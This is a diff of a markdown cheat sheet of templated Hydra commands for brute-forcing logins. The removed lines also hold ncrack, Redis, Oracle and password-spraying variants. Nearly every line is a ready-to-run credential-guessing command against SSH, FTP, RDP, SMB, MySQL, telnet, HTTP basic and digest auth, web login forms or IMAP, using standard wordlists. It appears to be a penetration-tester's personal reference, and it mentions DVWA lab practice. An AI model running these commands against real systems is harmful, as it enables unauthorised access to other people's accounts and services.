@@ -1,203 +1,93 @@
-# Hydra
+# hydra
 
-> Fast and flexible online password brute-forcing tool supporting numerous protocols
+> Only the patterns you actually use. Eight entries, nothing extra. `-I` (ignore restore) on every entry per your note style.
 
-<!-- tags: bruteforce, passwords, hydra, online, cracking -->
-
----
-
-## brute ssh
-Brute-force SSH login for a single user.
-
-```bash
-hydra -l {{USERNAME:str:root}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} ssh -t {{THREADS:int:4}} -V
-```
-
-<!-- meta: risk=med | phase=passwords | tags=ssh,bruteforce -->
+<!-- tags: hydra, brute, auth, ssh, ftp, smb, http-form -->
 
 ---
 
-## brute ftp ncrack
-Use Ncrack as alternative for FTP brute force (often faster).
+## brute simple service
+Single-user + password-list against the common simple services. Service picker covers ssh/ftp/rdp/mysql/pop3/smb/telnet — same syntax, pick one.
 
 ```bash
-ncrack -p ftp -U {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}}
+hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{SERVICE:choice:ssh,ftp,rdp,mysql,pop3,smb,telnet}} -I
 ```
 
-<!-- meta: risk=high | phase=passwords | tags=ncrack,ftp,bruteforce -->
+<!-- meta: risk=medium | phase=brute | tags=brute,service,picker -->
 
 ---
 
-## brute oracle sid
-Brute force Oracle database accounts.
+## brute userlist and wordlist
+Userlist × wordlist combo for when you don't know the login — same service picker.
 
 ```bash
-hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}} oracle-sid
+hydra -L {{USERS:file:/usr/share/seclists/Usernames/top-usernames-shortlist.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{SERVICE:choice:ssh,ftp,rdp,mysql,pop3,smb,telnet}} -I
 ```
 
-<!-- meta: risk=high | phase=passwords | tags=oracle,bruteforce -->
+<!-- meta: risk=medium | phase=brute | tags=brute,userlist,wordlist -->
 
 ---
 
-## brute rpc
-Brute force authentication on RPC endpoints.
+## http basic auth get
+HTTP Basic Auth against a protected path. For non-/admin targets, swap the `/admin`.
 
 ```bash
-hydra -l {{USERNAME:str}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:111}} rpc://{{TARGET:ip}}
+hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-get {{PATH:str:/admin}} -I
 ```
 
-<!-- meta: risk=high | phase=passwords | tags=rpc,bruteforce -->
+<!-- meta: risk=medium | phase=brute | tags=http,basic,get -->
 
 ---
 
-## brute redis
-Brute force Redis authentication password.
+## http basic auth digest
+Same but digest auth — `-m /path` carries the protected URL to the http-get-digest module.
 
 ```bash
-hydra -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} redis://{{TARGET:ip}}:{{PORT:port:6379}}
+hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -m {{PATH:str:/protected}} {{TARGET:ip}} http-get-digest -I
 ```
 
-<!-- meta: risk=high | phase=passwords | tags=redis,bruteforce -->
+<!-- meta: risk=medium | phase=brute | tags=http,digest -->
 
 ---
 
-## brute ftp
-Brute-force FTP login credentials.
+## http post form
+Classic login-form brute. Format of the service string: `path:body-with-^USER^-^PASS^:failure-marker`. `-fV` = stop on first match + verbose. Example from your DVWA notes.
 
 ```bash
-hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} ftp -t {{THREADS:int:10}} -V
+hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-post-form '{{FORM:str:/login:username=^USER^&password=^PASS^:Invalid}}' -fV -s {{PORT:port:80}} -t {{THREADS:int:1}} -I
 ```
 
-<!-- meta: risk=med | phase=passwords | tags=ftp,bruteforce -->
+<!-- meta: risk=medium | phase=brute | tags=http,post,form -->
 
 ---
 
-## brute http basic auth
-Brute-force HTTP Basic Authentication.
+## https post form
+HTTPS variant — URL goes INSIDE the service string instead of being a positional target.
 
 ```bash
-hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-get {{PATH:str:/admin}} -t {{THREADS:int:10}}
+hydra -l {{USER:str:user}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:443}} https-post-form '{{FORM:str:https://example.com/login.php:user=^USER^&pass=^PASS^:Login failed}}' -I
 ```
 
-<!-- meta: risk=med | phase=passwords | tags=http,basic-auth -->
+<!-- meta: risk=medium | phase=brute | tags=https,post,form -->
 
 ---
 
-## brute http post form
-Brute-force a web login form via HTTP POST.
+## https form get with user list
+Form brute using GET + userlist × wordlist, custom port.
 
 ```bash
-hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-post-form "{{PATH:str:/login.php}}:{{POST_BODY:str:username=^USER^&password=^PASS^}}:{{FAIL_STRING:str:Invalid credentials}}" -t {{THREADS:int:10}}
+hydra -L {{USERS:file:/usr/share/seclists/Usernames/top-usernames-shortlist.txt}} -P {{WORDLIST:wordlist:/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt}} -s {{PORT:port:443}} {{TARGET:ip}} https-form-get '{{FORM:str:/login/:username=^USER^&password=^PASS^:Failed.}}' -I
 ```
 
-<!-- meta: risk=med | phase=passwords | tags=http,post,form -->
+<!-- meta: risk=medium | phase=brute | tags=https,get,form,userlist -->
 
 ---
 
-## brute smb
-Brute-force SMB/Windows authentication.
+## imap with login tricks
+IMAP brute with `-e nsr` login tricks (multichoice: n=null password, s=same-as-login, r=reverse login). `tr -d ,` strips commas so hydra gets a single joined arg like `-e nsr`.
 
 ```bash
-hydra -l {{USERNAME:str:administrator}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} smb -t {{THREADS:int:5}} -V
+hydra -l {{USER:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -e $(echo "{{TRICKS:multichoice:n=null password,s=same as login,r=reverse login}}" | tr -d ,) -s {{PORT:port:993}} imap://{{TARGET:ip}} -I
 ```
 
-<!-- meta: risk=med | phase=passwords | tags=smb,bruteforce -->
-
----
-
-## brute rdp
-Brute-force Remote Desktop Protocol login.
-
-```bash
-hydra -l {{USERNAME:str:administrator}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} rdp -t {{THREADS:int:4}} -V
-```
-
-<!-- meta: risk=med | phase=passwords | tags=rdp,bruteforce -->
-
----
-
-## brute mysql
-Brute-force MySQL database login.
-
-```bash
-hydra -l {{USERNAME:str:root}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} mysql -t {{THREADS:int:10}} -V
-```
-
-<!-- meta: risk=med | phase=passwords | tags=mysql,database -->
-
----
-
-## spray password userlist
-Spray passwords across a list of usernames.
-
-```bash
-hydra -L {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{PROTOCOL:choice:ssh=SSH login,ftp=FTP login,smb=SMB login,rdp=RDP login,mysql=MySQL login,postgres=Postgres login,mssql=MSSQL login,telnet=telnet login,vnc=VNC login,ldap=LDAP bind,http-get=HTTP basic GET,http-post-form=HTTP form POST,pop3=POP3 login,imap=IMAP login}} -t {{THREADS:int:4}} -V
-```
-
-<!-- meta: risk=med | phase=passwords | tags=userlist,spray -->
-
----
-
-## brute credentials combo file
-Use a colon-separated credentials file (user:pass).
-
-```bash
-hydra -C {{CREDFILE:file:creds.txt}} {{TARGET:ip}} {{PROTOCOL:choice:ftp=FTP login,ssh=SSH login,smb=SMB login,rdp=RDP login,mysql=MySQL login,postgres=Postgres login,mssql=MSSQL login,telnet=telnet login,vnc=VNC login,ldap=LDAP bind,http-get=HTTP basic GET,http-post-form=HTTP form POST,pop3=POP3 login,imap=IMAP login}} -t {{THREADS:int:10}} -V
-```
-
-<!-- meta: risk=med | phase=passwords | tags=credentials,combo -->
-
----
-
-## brute https post form
-Brute force a login form over HTTPS on a custom port.
-
-```bash
-hydra -l {{USERNAME:str:user}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:443}} https-post-form "{{TARGET:str:example.com}}{{PATH:str:/login.php}}:{{POST_BODY:str:user=^USER^&pass=^PASS^}}:{{FAIL_STRING:str:Login failed}}" -I
-```
-
-<!-- meta: risk=med | phase=passwords | tags=https,form -->
-
----
-
-## brute http digest auth
-Brute-force endpoints protected by HTTP Digest auth.
-
-```bash
-hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -m {{PATH:str:/protected}} {{TARGET:ip}} http-get-digest -I
-```
-
-<!-- meta: risk=med | phase=passwords | tags=digest,http -->
-
----
-
-## brute pop3 mail
-Brute-force POP3 mail credentials.
-
-```bash
-hydra -l {{USERNAME:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} pop3 -I
-```
-
-<!-- meta: risk=med | phase=passwords | tags=pop3,mail -->
-
----
-
-## brute imap mail
-Brute-force IMAPS with empty, reverse, and same-as-user password tests.
-
-```bash
-hydra -l {{USERNAME:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -e nsr -s {{PORT:port:993}} imap://{{TARGET:ip}} -I
-```
-
-<!-- meta: risk=med | phase=passwords | tags=imap,mail -->
-
----
-
-## brute telnet
-Brute-force Telnet credentials.
-
-```bash
-hydra -L {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} telnet -I
-```
-
-<!-- meta: risk=med | phase=passwords | tags=telnet -->
+<!-- meta: risk=medium | phase=brute | tags=imap,tricks,multichoice -->
